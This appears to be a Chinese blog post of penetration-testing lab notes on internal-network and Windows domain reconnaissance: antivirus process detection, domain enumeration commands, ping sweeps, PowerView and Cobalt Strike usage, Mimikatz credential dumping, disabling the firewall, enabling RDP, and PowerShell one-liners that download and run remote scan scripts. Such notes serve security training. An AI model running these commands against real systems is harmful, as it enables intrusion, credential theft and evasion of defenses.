<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230904215159103.png" alt="image-20230904215159103"></p>
<h3 id="239-常见查毒软件进程">2.39 常见查毒软件进程</h3>
<pre><code class="hljs plaintext">tasklist /svc</code></pre>
<p>随后将结果放到avList中对比查看</p>
<table>
<thead>
<tr>
<th>进程</th>
<th>软件名称</th>
</tr>
</thead>
<tbody>
<tr>
<td>360SD.EXE</td>
<td>360杀毒</td>
</tr>
<tr>
<td>360TRAY.EXE</td>
<td>360实时保护</td>
</tr>
<tr>
<td>ZHUDONGFANGYU.EXE</td>
<td>360主动防御</td>
</tr>
<tr>
<td>KSAFETRAY.EXE</td>
<td>金山卫士</td>
</tr>
<tr>
<td>SAFEDOGUPDATECENTER.EXE</td>
<td>服务器安全狗</td>
</tr>
<tr>
<td>MCAFEE MCSHIELD.EXE</td>
<td>迈克菲杀毒软件</td>
</tr>
<tr>
<td>EGUI.EXE</td>
<td>NOD32</td>
</tr>
<tr>
<td>AVP.EXE</td>
<td>卡巴斯基</td>
</tr>
<tr>
<td>AVGUARD.EXE</td>
<td>小红伞</td>
</tr>
<tr>
<td>BDAGENT.EXE</td>
<td>BITDEFENDER</td>
</tr>
</tbody>
</table>
<p>可以用avList自动判断,项目地址:<a target="_blank" rel="noopener" href="https://github.com/gh0stkey/avList">https://github.com/gh0stkey/avList</a></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230905164342620.png" alt="image-20230905164342620"></p>
<h3 id="240-浏览器信息收集">2.40 浏览器信息收集</h3>
<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/moonD4rk/HackBrowserData">https://github.com/moonD4rk/HackBrowserData</a></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230905164434895.png" alt="image-20230905164434895"></p>
<h2 id="0x03-域环境信息收集">0x03 域环境信息收集</h2>
<h3 id="31-判断是否存在域">3.1 判断是否存在域</h3>
<p><code>ipconfig /all</code> 可查看网关IP地址、DNS的IP地址、域名、本机是否和DNS服务器处在同一网段等。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230907203316781.png" alt="image-20230907203316781"></p>
<h3 id="32-解析域名ip">3.2 解析域名ip</h3>
<p>通过反向解析查询命令<code>nslookup</code>来解析域名的IP地址，用解析到的IP地址进行对比，判断域控服务器和DNS服务器是否在同一台机器上</p>
<p><code>nslookup hacker.testlab(这里写自己的域控制服务器域名)</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230907203351564.png" alt="image-20230907203351564"></p>
<h3 id="33-查看当前权限">3.3 查看当前权限</h3>
<p><code>whoami</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230907203359645.png" alt="image-20230907203359645"></p>
<h3 id="34-获取域sid">3.4 获取域SID</h3>
<p><code>whoami /all</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230905165730621.png" alt="image-20230905165730621"></p>
<h3 id="35-查询指定用户的详情信息">3.5 查询指定用户的详情信息</h3>
<p><code>net user xxx /domain</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230909144644670.png" alt="image-20230909144644670"></p>
<h3 id="36-查看域内所有账号">3.6 查看域内所有账号</h3>
<p><code>net user /domain</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230909144558243.png" alt="image-20230909144558243"></p>
<h3 id="37-对比查看域域名和登录服务器域控制器的信息是否匹配">3.7 对比查看”域(域名)”和”登录服务器(域控制器)”的信息是否匹配</h3>
<p><code>systeminfo</code></p>
<p><strong>域名</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230909145055338.png" alt="image-20230909145055338"></p>
<p><strong>域控制器</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230909145142138.png" alt="image-20230909145142138"></p>
<h3 id="38-对比查看工作站域dns名称域名和登录域域控制器的信息是否相匹配">3.8 对比查看”工作站域DNS名称(域名)”和”登录域(域控制器)”的信息是否相匹配</h3>
<p><code>net config workstation	</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230909145319693.png" alt="image-20230909145319693"></p>
<h3 id="39-查看时间可以找到域控">3.9 查看时间可以找到域控</h3>
<p><code>net time /domain</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230909145333162.png" alt="image-20230909145333162"></p>
<h3 id="310-查看域密码策略">3.10 查看域密码策略</h3>
<p><code>net accounts /domain</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230909150815650.png" alt="image-20230909150815650"></p>
<h3 id="311-查看当前登录域">3.11 查看当前登录域</h3>
<p><code>net config workstation</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230909150852060.png" alt="image-20230909150852060"></p>
<h3 id="312-登录本机的域管理员">3.12 登录本机的域管理员</h3>
<p><code>net localgroup administrators /domain</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230909150937358.png" alt="image-20230909150937358"></p>
<h3 id="313-获取域控ip">3.13 获取域控ip</h3>
<p><code>ping -a xxx.com</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230909151005372.png" alt="image-20230909151005372"></p>
<h3 id="314-查询域">3.14 查询域</h3>
<p><code>net view /domain</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230909151021573.png" alt="image-20230909151021573"></p>
<h3 id="315-查询域内的所有计算机">3.15 查询域内的所有计算机</h3>
<p><code>net view /domain:HACKER</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230909153213712.png" alt="image-20230909153213712"></p>
<h3 id="316-查询域的所有组enterprise-admins组权限最大">3.16 查询域的所有组（enterprise admins组权限最大）</h3>
<p><code>net group /domain</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230909153243216.png" alt="image-20230909153243216"></p>
<h3 id="317-spn扫描">3.17 SPN扫描</h3>
<p><code>setspn -T domain -q /</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230909153349165.png" alt="image-20230909153349165"></p>
<p>这里我估计应该是没有spn吧</p>
<h3 id="318-查看域管理员的用户组">3.18 查看域管理员的用户组</h3>
<p><code>net group “domain admins” /domain</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230909153432879.png" alt="image-20230909153432879"></p>
<h3 id="319-查询域系统管理员用户组">3.19 查询域系统管理员用户组</h3>
<p><code>net group "Enterprise admins" /domain</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230909153514033.png" alt="image-20230909153514033"></p>
<h3 id="320-查看域控制器">3.20 查看域控制器</h3>
<p><code>net group "domain controllers" /domain</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230909153537898.png" alt="image-20230909153537898"></p>
<h3 id="321-查看域控制器的机器名">3.21 查看域控制器的机器名</h3>
<p><code>nltest /DCLIST:hacker</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230909153553577.png" alt="image-20230909153553577"></p>
<h3 id="322-查看dns缓存">3.22 查看dns缓存</h3>
<p><code>ipconfig /displaydns</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230909153647070.png" alt="image-20230909153647070"></p>
<h3 id="323-列域控c盘文件需要域管理员权限">3.23 列域控c盘文件(需要域管理员权限)</h3>
<p><code>dir \\WIN7-TEST.hacker.testlab\c$</code></p>
<p>这里不知为何我找不到指定的文件，或许是命令错误，找了半天发现是域名前面应该是两条反斜杠</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230909154736190.png" alt="image-20230909154736190"></p>
<h3 id="324-查询所有域成员计算机列表">3.24 查询所有域成员计算机列表</h3>
<p><code>net group "domain computers" /domain</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230909154831401.png" alt="image-20230909154831401"></p>
<h3 id="325-获取域信任信息">3.25 获取域信任信息</h3>
<p><code>nltest /domain_trusts</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230909154843289.png" alt="image-20230909154843289"></p>
<h3 id="326-获取域内用户的详细信息">3.26 获取域内用户的详细信息</h3>
<p><code>wmic useraccount get /all</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230909154900256.png" alt="image-20230909154900256"></p>
<h3 id="327-查看存在的用户">3.27 查看存在的用户</h3>
<p><code>dsquery user</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230909155236636.png" alt="image-20230909155236636"></p>
<p>这条命令只能在winserver服务器才能使用</p>
<h3 id="328-查询所有计算机名称">3.28 查询所有计算机名称</h3>
<p><code>dsquery computer</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230909155312203.png" alt="image-20230909155312203"></p>
<h3 id="329-攻击主机cmd扫描同网段存活ip">3.29 攻击主机CMD扫描同网段存活ip</h3>
<p>windows</p>
<pre><code class="hljs plaintext"># 扫c段
for /L %P in (1,1,254) DO @ping ‐w 1 ‐n 1 192.168.17.%P | findstr "TTL ="</code></pre>
<p>Linux</p>
<pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span>
NET=10.168.1.
<span class="hljs-keyword">for</span> IP <span class="hljs-keyword">in</span> {100..115}
<span class="hljs-keyword">do</span>
<span class="hljs-keyword">if</span> `ping -c2 -i0.2 -w2 $NET<span class="hljs-variable">$IP</span> &amp;&gt; /dev/null`
<span class="hljs-keyword">then</span> <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"$NET<span class="hljs-variable">$IP</span> is \033[31mup\033[0m"</span> 
<span class="hljs-keyword">else</span> <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"$NET<span class="hljs-variable">$IP</span> is \033[32mdown\033[0m"</span> 
<span class="hljs-keyword">fi</span>
<span class="hljs-keyword">done</span></code></pre>
<p>扫b段</p>
<pre><code class="hljs plaintext">for i in 192.168.{1..254}.{1..254}; do if ping -c 3 -w 3 $i &amp;&gt;/dev/null;then echo $i is alived; fi; done</code></pre>
<h3 id="330-powerviewps域内信息收集">3.30 PowerView.ps域内信息收集</h3>
<p>Invoke-NetView //查域内环境<br>
Invoke-ShareFinder //查共享目录<br>
Invoke-MapDomainTrusts //查看域内信任关系<br>
Get-NetLocalGroup -HostName TARGET(主机名) //查看指定用户的登录时间、所属组情况</p>
<h3 id="331-cs信息收集">3.31 cs信息收集</h3>
<h4 id="target组信息的命令">target组信息的命令</h4>
<p>net group \Target<br>
net localgroup \target 组名</p>
<h4 id="获取远程目录">获取远程目录</h4>
<p>shell dir \target\c$<br>
shell dir /S /B \target\c$\users //递归获取多级目录及文件</p>
<h4 id="cs通过powershell命令获取目录信息">cs通过powershell命令获取目录信息</h4>
<p>powersehll Invoke-Command -ComputerName target -ScriptBlock{dir c:}<br>
powershell Invoke-Command -ComputerName target -ScriptBlock{net localgroup administrators}</p>
<h4 id="cs通过mimikatz抓取远程哈希值">cs通过mimikatz抓取远程哈希值</h4>
<p>powershell-import Invoke-Mimikatz.ps1<br>
powershell Invoke-Mimikatz -DumpCreds<br>
powershell Invoke-Mimikatz -Command ‘“privilege::debug” “sekurlsa::logonPasswords full”‘</p>
<h3 id="332-防火墙相关">3.32 防火墙相关</h3>
<ol>
<li>
<p>关闭防火墙</p>
<p>Windows Server 2003及之前的版本(admin)：</p>
<pre><code class="hljs plaintext">netsh firewall set opmode disable</code></pre>
<p>Windows Server 2003之后的版本(admin)：</p>
<pre><code class="hljs plaintext">netsh advfirewall set allprofiles state off</code></pre>
</li>
<li>
<p>查看防火墙配置：</p>
<pre><code class="hljs plaintext">netsh firewall show config</code></pre>
</li>
</ol>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230909162001555.png" alt="image-20230909162001555"></p>
<ol>
<li>
<p>修改防火墙配置</p>
<p>Windows Server 2003及之前的版本，允许指定程序全部连接：</p>
<pre><code class="hljs plaintext">netsh firewall add allowedprogram c:\nc.exe "allow nc" enable</code></pre>
<p>Windows Server 2003之后的版本，情况如下。</p>
<p>允许指定程序进入：</p>
<pre><code class="hljs plaintext">netsh advfirewall firewall add rule name="pass nc" dir=in action=allow program="C:\nc.exe"</code></pre>
<p>允许指定程序退出：</p>
<pre><code class="hljs plaintext">netsh advfirewall firewall add rule name="Allow nc" dir=out action=allow program="C:\nc.exe"</code></pre>
<p>允许3389端口放行：</p>
<pre><code class="hljs plaintext">netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389 action=allow</code></pre>
<p>自定义防火墙日志的储存位置</p>
<pre><code class="hljs plaintext">netsh advfirewall set currentprofile logging filename "C:\windows\temp\fw.log"</code></pre>
</li>
</ol>
<h3 id="333-查询代理配置情况">3.33 查询代理配置情况</h3>
<pre><code class="hljs plaintext">reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings"</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230909162103233.png" alt="image-20230909162103233"></p>
<h3 id="334-查询并开启远程连接服务">3.34 查询并开启远程连接服务</h3>
<ol>
<li>
<p>查看远程连接端口</p>
<p>0xd3d转换后就是3389</p>
<pre><code class="hljs plaintext">REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /V PortNumber</code></pre>
</li>
<li>
<p>在Windows Server 2003中开启3389端口</p>
</li>
</ol>
<pre><code class="hljs plaintext">wmic path win32_terminalservicesetting where (__CLASS !="")  call setallowtsconnections 1</code></pre>
<ol start="3">
<li>在Windows Server 2008和Windows Server 2012中开启3389端口</li>
</ol>
<pre><code class="hljs plaintext">wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !="") call setallowtsconnections 1

wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName='RDP-Tcp') call setuserauthenticationrequired 1

reg add "HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f</code></pre>
<h3 id="335-端口扫描">3.35 端口扫描</h3>
<h4 id="1-telnet端口连接">1. telnet端口连接</h4>
<p>没有开启的话去“打开或关闭windows功能”开启</p>
<ul>
<li>telnet只用于确认端口是否开启用，不拿来端口扫描</li>
</ul>
<pre><code class="hljs plaintext">telnet &lt;主机&gt; &lt;端口&gt;
telnet 192.168.52.138 445</code></pre>
<h4 id="2-powersploit-中的invoke-portscanps1脚本">2. PowerSploit 中的Invoke-portscan.ps1脚本</h4>
<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a></p>
<p>端口扫描利用到工具包中的<code>Portscan.ps1</code></p>
<pre><code class="hljs plaintext">powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('https://github.com/powersploit/Recon/Invoke-Portscan.ps1');Invoke-Portscan -Hosts 192.168.17.1/24 -T 4 -ports '445,1433,8080,80,3389'"

// 或者扫描全部的端口：-Ports "1-65535"</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230909164333290.png" alt="image-20230909164333290"></p>
<h4 id="3-nishang中的invoke-portscanps1">3. Nishang中的Invoke-portscan.ps1</h4>
<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/samratashok/nishang">https://github.com/samratashok/nishang</a></p>
<p>该脚本可用于发现主机、解析主机名、扫描端口。</p>
<pre><code class="hljs plaintext">powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://39.xxx.xxx.210/nishang/Scan/Invoke-PortScan.ps1');Invoke-PortScan -StartAddress 192.168.1.1 -EndAddress 192.168.1.255 -ResolveHost -Port '1-65535'"

// -ResolveHost：解析主机名</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230909164401808.png" alt="image-20230909164401808"></p>
<h4 id="4-nmap扫描">4. Nmap扫描</h4>
<p>一般通过挂代理，nmap远程扫描</p>
<p>《内网渗透测试：隐藏通讯隧道技术》</p>
<h4 id="5-metasploit-端口扫描模块">5. Metasploit 端口扫描模块</h4>
<p>Metasploit中提供了很多内置的扫描模块，使用方便，在侵入内网后设置好路由直接扫即可，有时速度有些慢。几个常用的：</p>
<pre><code class="hljs plaintext">auxiliary/scanner/portscan/tcp
auxiliary/scanner/portscan/tcp
auxiliary/scanner/portscan/ack</code></pre>
<h4 id="6-收集域内端口的banner信息">6. 收集域内端口的banner信息</h4>
<p>banner信息表示“欢迎语”，其中会包含一些敏感信息，在banner信息中，可以获取到软件开发商、软件名称、服务类型、版本号等，而版本号信息有时会存在公开的CVE可以利用。获取到版本号后，可以在中查找到对应的CVE编号，并在<a target="_blank" rel="noopener" href="https://www.exploit-db.com/">ExploitDB</a>等平台上面找到相关的利用方式。</p>
<h4 id="获取banner">获取Banner</h4>
<p>扫描到端口后就要获取到其Banner信息，接着就可以在漏洞库里查找poc，这个可以找一下常见的端口的服务来得知</p>
<table>
<thead>
<tr>
<th>端口号</th>
<th>端口说明</th>
<th>攻击技巧</th>
</tr>
</thead>
<tbody>
<tr>
<td>21/22/69</td>
<td>ftp/tftp：文件传输协议</td>
<td>允许匿名上传、下载、爆破、嗅探、溢出和后门</td>
</tr>
<tr>
<td>22</td>
<td>ssh：远程连接</td>
<td>爆破OpenSSH；28个退格</td>
</tr>
<tr>
<td>23</td>
<td>telnet：远程连接</td>
<td>爆破\嗅探、弱口令</td>
</tr>
<tr>
<td>25</td>
<td>smtp：邮件服务</td>
<td>邮件伪造</td>
</tr>
<tr>
<td>53</td>
<td>DNS：域名系统</td>
<td>DNS区域传输\DNS劫持\DNS缓存投毒\DNS欺骗\利用DNS隧道技术刺透防火墙</td>
</tr>
<tr>
<td>67/68</td>
<td>dhcp</td>
<td>劫持\欺骗</td>
</tr>
<tr>
<td>80/443/8080</td>
<td>常见web服务端口</td>
<td>web攻击、爆破、对应服务器版本漏洞</td>
</tr>
<tr>
<td>110</td>
<td>pop3</td>
<td>爆破、嗅探</td>
</tr>
<tr>
<td>139</td>
<td>samba</td>
<td>爆破\未授权访问\远程代码执行</td>
</tr>
<tr>
<td>143</td>
<td>imap</td>
<td>爆破</td>
</tr>
<tr>
<td>161</td>
<td>snmp</td>
<td>爆破</td>
</tr>
<tr>
<td>389</td>
<td>ldap目录访问协议</td>
<td>注入攻击\未授权访问，弱口令</td>
</tr>
<tr>
<td>512/513/514</td>
<td>linux rexec</td>
<td>直接使用rlogin\爆破</td>
</tr>
<tr>
<td>873</td>
<td>rsync</td>
<td>未授权访问\文件上传</td>
</tr>
<tr>
<td>1080</td>
<td>socket</td>
<td>爆破：进行内网渗透</td>
</tr>
<tr>
<td>1352</td>
<td>lotus Domino邮件服务</td>
<td>爆破：弱口令\信息泄漏：源代码</td>
</tr>
<tr>
<td>1433</td>
<td>mssql</td>
<td>爆破：使用系统用户登录\注入攻击\SA弱口令</td>
</tr>
<tr>
<td>1521</td>
<td>oracle</td>
<td>爆破：TNS\注入攻击\反弹shell</td>
</tr>
<tr>
<td>2049</td>
<td>nfs</td>
<td>配置不当</td>
</tr>
<tr>
<td>2181</td>
<td>zookeeper</td>
<td>未授权访问</td>
</tr>
<tr>
<td>3306</td>
<td>mysql</td>
<td>爆破\拒绝服务\注入\提权</td>
</tr>
<tr>
<td>3389</td>
<td>rdp</td>
<td>爆破\Shift后门</td>
</tr>
<tr>
<td>3690</td>
<td>SVN服务</td>
<td>SVN泄露\未授权访问</td>
</tr>
<tr>
<td>4848</td>
<td>glassfish</td>
<td>爆破：控制台弱口令\认证绕过</td>
</tr>
<tr>
<td>5000</td>
<td>sybase/DB2</td>
<td>爆破\注入</td>
</tr>
<tr>
<td>5432</td>
<td>postgresql</td>
<td>缓冲区溢出\注入攻击\爆破：弱口令</td>
</tr>
<tr>
<td>5632</td>
<td>pcanywhere</td>
<td>拒绝服务\代码执行，抓取密码</td>
</tr>
<tr>
<td>5900</td>
<td>vnc</td>
<td>爆破：弱口令\认证绕过</td>
</tr>
<tr>
<td>6379</td>
<td>redis</td>
<td>未授权访问\爆破：弱口令</td>
</tr>
<tr>
<td>7001/7002</td>
<td>weblogic</td>
<td>Java反序列化\控制台弱口令\控制台部署webshell</td>
</tr>
<tr>
<td>8069</td>
<td>zabbix</td>
<td>远程命令执行\SQL注入</td>
</tr>
<tr>
<td>8080/8089</td>
<td>JBoss/Resin/Jetty/Jenkins</td>
<td>反序列化、控制台弱口令</td>
</tr>
<tr>
<td>9090</td>
<td>websphere控制台</td>
<td>爆破：控制台弱口令\Java反序列</td>
</tr>
<tr>
<td>9200/9300</td>
<td>elasticsearch</td>
<td>远程代码执行</td>
</tr>
<tr>
<td>10000</td>
<td>webmin控制面板</td>
<td>弱口令</td>
</tr>
<tr>
<td>11211</td>
<td>memcacache</td>
<td>未授权访问</td>
</tr>
<tr>
<td>27017/27018</td>
<td>mongodb</td>
<td>爆破\未授权访问</td>
</tr>
<tr>
<td>50000</td>
<td>SAP Management Console</td>
<td>远程执行</td>
</tr>
</tbody>
</table>
<h4 id="7-使用nmap获取banner">7. 使用Nmap获取banner</h4>
<pre><code class="hljs plaintext">nmap &lt;IP地址&gt; --script=banner -p &lt;端口/端口范围&gt;</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230909165322963.png" alt="image-20230909165322963"></p>
<p>我这里没banner，就借用图片了</p>
<h4 id="8-使用nc获取banner">8. 使用nc获取banner</h4>
<pre><code class="hljs plaintext">nc -nv &lt;IP地址&gt; &lt;端口&gt;</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230909165400049.png" alt="image-20230909165400049"></p>
<h3 id="336-存活主机扫描">3.36 存活主机扫描</h3>
<h4 id="nbtscan">nbtscan</h4>
<p>nbtscan.exe是一个命令行工具，用于扫描本地或远程TCP/IP网络上的开放NetBIOS名称服务器。</p>
<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/MrAnonymous-1/nbtscan">https://github.com/MrAnonymous-1/nbtscan</a></p>
<p>将nbtscan.exe上传到目标主机上，然后直接输入ip段即可运行扫描：</p>
<pre><code class="hljs plaintext">//扫描一个网段
nbtscan-1.0.35.exe 192.168.17.0/24
//扫描两个网段
nbtscan.exe 192.168.1.0/24 192.168.2.0/24</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230909165437963.png" alt="image-20230909165437963"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230909170645739.png" alt="image-20230909170645739"></p>
<p>参数解释：</p>
<ul>
<li>SHARING：该主机存在正在运行的文件和打印共享服务</li>
<li>DC：该机器可能是域控制器</li>
<li>?：没有识别处该机器的NetBIOS资源</li>
</ul>
<h4 id="ping">ping</h4>
<p>基于icmp扫描内网</p>
<pre><code class="hljs plaintext">for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.17.%I | findstr "TTL="
//兼容win7
for /l %i in (1,1,254) do @ping -a 10.0.1.%i -w 1 -n 1 | find /i "Ping"
//扫b段
for /l %i in (1,1,254) do @ping -a 10.0.%i.1 -w 1 -n 1 | find /i "Ping"</code></pre>
